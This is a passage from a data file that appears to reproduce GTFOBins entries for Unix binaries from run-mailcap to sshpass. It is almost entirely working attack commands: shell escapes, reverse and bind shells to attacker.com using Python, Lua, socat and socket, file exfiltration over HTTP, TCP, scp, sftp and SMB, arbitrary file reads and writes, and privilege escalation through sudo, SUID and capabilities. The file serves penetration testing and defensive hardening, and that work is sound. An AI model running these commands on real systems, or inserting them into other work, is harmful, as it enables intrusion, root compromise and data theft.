                            "The file must exist and be not empty.\n\nThis invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply.\n",
                        code: "run-mailcap --action=edit file_to_read",
                    },
                ],
                sudo: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n",
                    },
                ],
            },
        },
        "run-parts": {
            functions: {
                shell: [
                    {
                        code: "run-parts --new-session --regex '^sh$' /bin",
                    },
                ],
                sudo: [
                    {
                        code: "sudo run-parts --new-session --regex '^sh$' /bin",
                    },
                ],
                suid: [
                    {
                        code: "./run-parts --new-session --regex '^sh$' /bin --arg='-p'",
                    },
                ],
            },
        },
        runscript: {
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nrunscript $TF\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\n./runscript $TF\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nsudo runscript $TF\n",
                    },
                ],
            },
        },
        rview: {
            functions: {
                shell: [
                    {
                        description:
                            "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'rview -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                    {
                        description: "This requires that `rview` is compiled with Lua support.",
                        code: "rview -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
                "reverse-shell": [
                    {
                        description:
                            "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nrview -c \':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn("/bin/sh")\nvim.command(":q!")\'\n',
                    },
                ],
                "non-interactive-reverse-shell": [
                    {
                        description:
                            "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nrview -c \':lua local s=require("socket"); local t=assert(s.tcp());\n  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,"r"));\n    local b=assert(f:read("*a"));t:send(b);\n  end;\n  f:close();t:close();\'\n',
                    },
                ],
                "non-interactive-bind-shell": [
                    {
                        description:
                            "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.",
                        code: 'export LPORT=12345\nrview -c \':lua local k=require("socket");\n  local s=assert(k.bind("*",os.getenv("LPORT")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,"r"));\n    local b=assert(f:read("*a"));c:send(b);\n  end;c:close();f:close();\'\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            'This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.',
                        code: 'export URL=http://attacker.com/\nexport LFILE=file_to_send\nrview -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.",
                        code: 'export LPORT=8888\nrview -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            'Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.',
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrview -c \':lua local f=io.open(os.getenv("LFILE"), \'rb\')\n  local d=f:read("*a")\n  io.close(f);\n  local s=require("socket");\n  local t=assert(s.tcp());\n  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));\n  t:send(d);\n  t:close();\'\n',
                    },
                ],
                "file-download": [
                    {
                        description:
                            "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.",
                        code: 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrview -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e["URL"], e["LFILE"])\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            'Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.',
                        code: 'export LPORT=12345\nexport LFILE=file_to_save\nrview -c \':lua local k=require("socket");\n  local s=assert(k.bind("*",os.getenv("LPORT")));\n  local c=s:accept();\n  local d,x=c:receive("*a");\n  c:close();\n  local f=io.open(os.getenv("LFILE"), "wb");\n  f:write(d);\n  io.close(f);\'\n',
                    },
                ],
                "file-write": [
                    {
                        code: "rview file_to_write\niDATA\n^[\nw!\n",
                    },
                ],
                "file-read": [
                    {
                        code: "rview file_to_read",
                    },
                ],
                "library-load": [
                    {
                        description:
                            "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'rview -c \':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")\'',
                    },
                ],
                suid: [
                    {
                        description:
                            "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: './rview -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
                    },
                ],
                sudo: [
                    {
                        description:
                            "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'sudo rview -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                    {
                        description: "This requires that `rview` is compiled with Lua support.",
                        code: "sudo rview -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
                capabilities: [
                    {
                        description:
                            "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: './rview -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                ],
                "limited-suid": [
                    {
                        description: "This requires that `rview` is compiled with Lua support.",
                        code: "./rview -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
            },
        },
        rvim: {
            functions: {
                shell: [
                    {
                        description:
                            "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'rvim -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                    {
                        description: "This requires that `rvim` is compiled with Lua support.",
                        code: "rvim -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
                "reverse-shell": [
                    {
                        description:
                            "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nrvim -c \':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn("/bin/sh")\nvim.command(":q!")\'\n',
                    },
                ],
                "non-interactive-reverse-shell": [
                    {
                        description:
                            "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nrvim -c \':lua local s=require("socket"); local t=assert(s.tcp());\n  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,"r"));\n    local b=assert(f:read("*a"));t:send(b);\n  end;\n  f:close();t:close();\'\n',
                    },
                ],
                "non-interactive-bind-shell": [
                    {
                        description:
                            "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.",
                        code: 'export LPORT=12345\nrvim -c \':lua local k=require("socket");\n  local s=assert(k.bind("*",os.getenv("LPORT")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,"r"));\n    local b=assert(f:read("*a"));c:send(b);\n  end;c:close();f:close();\'\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            'This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.',
                        code: 'export URL=http://attacker.com/\nexport LFILE=file_to_send\nrvim -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.",
                        code: 'export LPORT=8888\nrvim -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            'Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.',
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrvim -c \':lua local f=io.open(os.getenv("LFILE"), \'rb\')\n  local d=f:read("*a")\n  io.close(f);\n  local s=require("socket");\n  local t=assert(s.tcp());\n  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));\n  t:send(d);\n  t:close();\'\n',
                    },
                ],
                "file-download": [
                    {
                        description:
                            "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.",
                        code: 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrvim -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e["URL"], e["LFILE"])\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            'Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.',
                        code: 'export LPORT=12345\nexport LFILE=file_to_save\nrvim -c \':lua local k=require("socket");\n  local s=assert(k.bind("*",os.getenv("LPORT")));\n  local c=s:accept();\n  local d,x=c:receive("*a");\n  c:close();\n  local f=io.open(os.getenv("LFILE"), "wb");\n  f:write(d);\n  io.close(f);\'\n',
                    },
                ],
                "file-write": [
                    {
                        code: "rvim file_to_write\niDATA\n^[\nw\n",
                    },
                ],
                "file-read": [
                    {
                        code: "rvim file_to_read",
                    },
                ],
                "library-load": [
                    {
                        description:
                            "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'rvim -c \':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")\'',
                    },
                ],
                suid: [
                    {
                        description:
                            "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: './rvim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
                    },
                ],
                sudo: [
                    {
                        description:
                            "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'sudo rvim -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                    {
                        description: "This requires that `rvim` is compiled with Lua support.",
                        code: "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
                capabilities: [
                    {
                        description:
                            "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: './rvim -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                ],
                "limited-suid": [
                    {
                        description: "This requires that `rvim` is compiled with Lua support.",
                        code: "./rvim -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
            },
        },
        sash: {
            functions: {
                shell: [
                    {
                        code: "sash",
                    },
                ],
                suid: [
                    {
                        code: "./sash",
                    },
                ],
                sudo: [
                    {
                        code: "sudo sash",
                    },
                ],
            },
        },
        scanmem: {
            functions: {
                shell: [
                    {
                        code: "scanmem\nshell /bin/sh\n",
                    },
                ],
                suid: [
                    {
                        code: "./scanmem\nshell /bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo scanmem\nshell /bin/sh\n",
                    },
                ],
            },
        },
        scp: {
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:\n",
                    },
                ],
                "file-upload": [
                    {
                        description: "Send local file to a SSH server.",
                        code: "RPATH=user@attacker.com:~/file_to_save\nLPATH=file_to_send\nscp $LFILE $RPATH\n",
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file from a SSH server.",
                        code: "RPATH=user@attacker.com:~/file_to_get\nLFILE=file_to_save\nscp $RPATH $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF a b:\n",
                    },
                ],
            },
        },
        screen: {
            functions: {
                shell: [
                    {
                        code: "screen",
                    },
                ],
                "file-write": [
                    {
                        description:
                            "This works on screen version 4.06.02. Data is appended to the file and `\\n` is converted to `\\r\\n`.",
                        code: "LFILE=file_to_write\nscreen -L -Logfile $LFILE echo DATA\n",
                    },
                    {
                        description:
                            "This works on screen version 4.05.00. Data is appended to the file and `\\n` is converted to `\\r\\n`.",
                        code: "LFILE=file_to_write\nscreen -L $LFILE echo DATA\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo screen",
                    },
                ],
            },
        },
        script: {
            functions: {
                shell: [
                    {
                        code: "script -q /dev/null",
                    },
                ],
                sudo: [
                    {
                        code: "sudo script -q /dev/null",
                    },
                ],
                "file-write": [
                    {
                        description: "The wrote content is corrupted by debug prints.",
                        code: "script -q -c 'echo DATA' file_to_write",
                    },
                ],
            },
        },
        scrot: {
            description: "This requires a running X server.",
            functions: {
                shell: [
                    {
                        code: "scrot -e /bin/sh",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./scrot -e /bin/sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo scrot -e /bin/sh",
                    },
                ],
            },
        },
        sed: {
            functions: {
                shell: [
                    {
                        description: "GNU version only. Also, this requires `bash`.",
                        code: "sed -n '1e exec sh 1>&0' /etc/hosts",
                    },
                    {
                        description: "GNU version only. The resulting shell is not a proper TTY shell.",
                        code: "sed e",
                    },
                ],
                command: [
                    {
                        description: "GNU version only.",
                        code: "sed -n '1e id' /etc/hosts",
                    },
                ],
                "file-write": [
                    {
                        code: 'LFILE=file_to_write\nsed -n "1s/.*/DATA/w $LFILE" /etc/hosts\n',
                    },
                ],
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nsed '' \"$LFILE\"\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n",
                    },
                ],
                sudo: [
                    {
                        description: "GNU version only. Also, this requires `bash`.",
                        code: "sudo sed -n '1e exec sh 1>&0' /etc/hosts",
                    },
                ],
            },
        },
        service: {
            functions: {
                shell: [
                    {
                        code: "/usr/sbin/service ../../bin/sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo service ../../bin/sh",
                    },
                ],
            },
        },
        setarch: {
            description: "The `uname -m` command can be used in place of `arch` to obtain the architecture.",
            functions: {
                shell: [
                    {
                        code: "setarch $(arch) /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./setarch $(arch) /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo setarch $(arch) /bin/sh",
                    },
                ],
            },
        },
        setfacl: {
            description:
                "This can be run with elevated privileges to change ownership and then read, write, or execute a file.",
            functions: {
                suid: [
                    {
                        code: "LFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE\n",
                    },
                ],
            },
        },
        setlock: {
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp)\nsetlock $TF /bin/sh\n",
                    },
                ],
                suid: [
                    {
                        code: "./setlock - /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo setlock - /bin/sh",
                    },
                ],
            },
        },
        sftp: {
            functions: {
                shell: [
                    {
                        code: "HOST=user@attacker.com\nsftp $HOST\n!/bin/sh\n",
                    },
                ],
                "file-upload": [
                    {
                        description: "Send local file to a SSH server.",
                        code: "RHOST=user@attacker.com\nsftp $RHOST\nput file_to_send file_to_save\n",
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file from a SSH server.",
                        code: "RHOST=user@attacker.com\nsftp $RHOST\nget file_to_get file_to_save\n",
                    },
                ],
                sudo: [
                    {
                        code: "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n",
                    },
                ],
            },
        },
        sg: {
            functions: {
                shell: [
                    {
                        description:
                            "Commands can be run if the current user's group is specified, therefore no additional permissions are needed.",
                        code: "sg $(id -ng)\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo sg root\n",
                    },
                ],
            },
        },
        shuf: {
            functions: {
                "file-read": [
                    {
                        description:
                            "The read file content is corrupted by randomizing the order of NUL terminated strings.",
                        code: 'LFILE=file_to_read\nshuf -z "$LFILE"\n',
                    },
                ],
                "file-write": [
                    {
                        description: "The written file content is corrupted by adding a newline.",
                        code: 'LFILE=file_to_write\nshuf -e DATA -o "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        description: "The written file content is corrupted by adding a newline.",
                        code: 'LFILE=file_to_write\n./shuf -e DATA -o "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        description: "The written file content is corrupted by adding a newline.",
                        code: 'LFILE=file_to_write\nsudo shuf -e DATA -o "$LFILE"\n',
                    },
                ],
            },
        },
        slsh: {
            functions: {
                shell: [
                    {
                        code: "slsh -e 'system(\"/bin/sh\")'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo slsh -e 'system(\"/bin/sh\")'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./slsh -e 'system(\"/bin/sh\")'",
                    },
                ],
            },
        },
        smbclient: {
            description: "A valid SMB/CIFS server must be available.",
            functions: {
                shell: [
                    {
                        code: "smbclient '\\\\attacker\\share'\n!/bin/sh\n",
                    },
                ],
                "file-upload": [
                    {
                        description:
                            "Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.",
                        code: "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'\n",
                    },
                ],
                "file-download": [
                    {
                        description:
                            "Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file.",
                        code: "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n",
                    },
                ],
            },
        },
        snap: {
            functions: {
                sudo: [
                    {
                        description:
                            "It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nCOMMAND=id\ncd $(mktemp -d)\nmkdir -p meta/hooks\nprintf '#!/bin/sh\\n%s; false' \"$COMMAND\" >meta/hooks/install\nchmod +x meta/hooks/install\nfpm -n xxxx -s dir -t snap -a all meta\n```\n",
                        code: "sudo snap install xxxx_1.0_all.snap --dangerous --devmode\n",
                    },
                ],
            },
        },
        socat: {
            functions: {
                shell: [
                    {
                        description: "The resulting shell is not a proper TTY shell and lacks the prompt.",
                        code: "socat stdin exec:/bin/sh\n",
                    },
                ],
                "reverse-shell": [
                    {
                        description:
                            "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
                        code: "RHOST=attacker.com\nRPORT=12345\nsocat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane\n",
                    },
                ],
                "bind-shell": [
                    {
                        description:
                            "Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell.",
                        code: "LPORT=12345\nsocat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane\n",
                    },
                ],
                "file-upload": [
                    {
                        description:
                            "Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file.",
                        code: "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nsocat -u file:$LFILE tcp-connect:$RHOST:$RPORT\n",
                    },
                ],
                "file-download": [
                    {
                        description:
                            "Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.",
                        code: "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nsocat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat\n",
                    },
                ],
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nsocat -u "file:$LFILE" -\n',
                    },
                ],
                "file-write": [
                    {
                        code: "LFILE=file_to_write\nsocat -u 'exec:echo DATA' \"open:$LFILE,creat\"\n",
                    },
                ],
                sudo: [
                    {
                        description: "The resulting shell is not a proper TTY shell and lacks the prompt.",
                        code: "sudo socat stdin exec:/bin/sh\n",
                    },
                ],
                "limited-suid": [
                    {
                        description:
                            "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
                        code: "RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane\n",
                    },
                ],
            },
        },
        socket: {
            functions: {
                "reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: "RHOST=attacker.com\nRPORT=12345\nsocket -qvp '/bin/sh -i' $RHOST $RPORT\n",
                    },
                ],
                "bind-shell": [
                    {
                        description: "Run `nc target.com 12345` on the attacker box to connect to the shell.",
                        code: "LPORT=12345\nsocket -svp '/bin/sh -i' $LPORT\n",
                    },
                ],
            },
        },
        soelim: {
            description:
                "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nsoelim "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./soelim "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo soelim "$LFILE"\n',
                    },
                ],
            },
        },
        softlimit: {
            functions: {
                shell: [
                    {
                        code: "softlimit /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./softlimit /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo softlimit /bin/sh",
                    },
                ],
            },
        },
        sort: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nsort -m "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./sort -m "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo sort -m "$LFILE"\n',
                    },
                ],
            },
        },
        split: {
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nTF=$(mktemp)\nsplit $LFILE $TF\ncat $TF*\n",
                    },
                ],
                "file-write": [
                    {
                        description:
                            "Data will be written in the current directory in a file named `xaa` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.",
                        code: "TF=$(mktemp)\necho DATA >$TF\nsplit -b999m $TF\n",
                    },
                    {
                        description:
                            "GNU version only. Data will be written in the current directory in a file named `xaa.xxx` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.",
                        code: "EXT=.xxx\nTF=$(mktemp)\necho DATA >$TF\nsplit -b999m --additional-suffix $EXTENSION $TF\n",
                    },
                ],
                command: [
                    {
                        description: "Command execution using an existing or newly created file.",
                        code: "COMMAND=id\nTF=$(mktemp)\nsplit --filter=$COMMAND $TF\n",
                    },
                    {
                        description: "Command execution using stdin (and close it directly).",
                        code: "COMMAND=id\necho | split --filter=$COMMAND /dev/stdin\n",
                    },
                ],
                shell: [
                    {
                        description: "The shell prompt is not printed.",
                        code: "split --filter=/bin/sh /dev/stdin\n",
                    },
                ],
                sudo: [
                    {
                        description: "The shell prompt is not printed.",
                        code: "sudo split --filter=/bin/sh /dev/stdin\n",
                    },
                ],
            },
        },
        sqlite3: {
            functions: {
                shell: [
                    {
                        code: "sqlite3 /dev/null '.shell /bin/sh'",
                    },
                ],
                "file-write": [
                    {
                        code: 'LFILE=file_to_write\nsqlite3 /dev/null -cmd ".output $LFILE" \'select "DATA";\'\n',
                    },
                ],
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo sqlite3 /dev/null '.shell /bin/sh'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./sqlite3 /dev/null '.shell /bin/sh'",
                    },
                ],
            },
        },
        sqlmap: {
            description: "This allows to execute [`python`](/gtfobins/python/) code, other functions may apply.",
            functions: {
                shell: [
                    {
                        code: "sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\"",
                    },
                ],
                sudo: [
                    {
                        code: "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\"",
                    },
                ],
            },
        },
        ss: {
            description:
                "The file content is actually parsed so only a part of the first line is returned as a part of an error message.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nss -a -F $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./ss -a -F $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo ss -a -F $LFILE\n",
                    },
                ],
            },
        },
        "ssh-agent": {
            functions: {
                shell: [
                    {
                        code: "ssh-agent /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./ssh-agent /bin/ -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ssh-agent /bin/",
                    },
                ],
            },
        },
        "ssh-keygen": {
            functions: {
                "library-load": [
                    {
                        description: "",
                        code: "ssh-keygen -D ./lib.so",
                    },
                ],
                sudo: [
                    {
                        description: "",
                        code: "sudo ssh-keygen -D ./lib.so",
                    },
                ],
                suid: [
                    {
                        description: "",
                        code: "./ssh-keygen -D ./lib.so",
                    },
                ],
            },
        },
        "ssh-keyscan": {
            description:
                "The file content is actually parsed so only a part of each line is returned as a part of an error message.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nssh-keyscan -f $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n",
                    },
                ],
            },
        },
        ssh: {
            functions: {
                shell: [
                    {
                        description: "Reconnecting may help bypassing restricted shells.",
                        code: "ssh localhost $SHELL --noprofile --norc",
                    },
                    {
                        description: "Spawn interactive shell through ProxyCommand option.",
                        code: "ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
                    },
                    {
                        description:
                            "Spawn interactive shell on client, requires a successful connection towards `host`.",
                        code: "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host",
                    },
                ],
                "file-upload": [
                    {
                        description: "Send local file to a SSH server.",
                        code: 'HOST=user@attacker.com\nRPATH=file_to_save\nLPATH=file_to_send\nssh $HOST "cat > $RPATH" < $LPATH\n',
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file from a SSH server.",
                        code: 'HOST=user@attacker.com\nRPATH=file_to_get\nLPATH=file_to_save\nssh $HOST "cat $RPATH" > $LPATH\n',
                    },
                ],
                "file-read": [
                    {
                        description: "The read file content is corrupted by error prints.",
                        code: "LFILE=file_to_read\nssh -F $LFILE localhost\n",
                    },
                ],
                sudo: [
                    {
                        description: "Spawn interactive root shell through ProxyCommand option.",
                        code: "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
                    },
                ],
            },
        },
        sshpass: {
            functions: {
                shell: [
                    {
                        code: "sshpass /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./sshpass /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo sshpass /bin/sh",
                    },
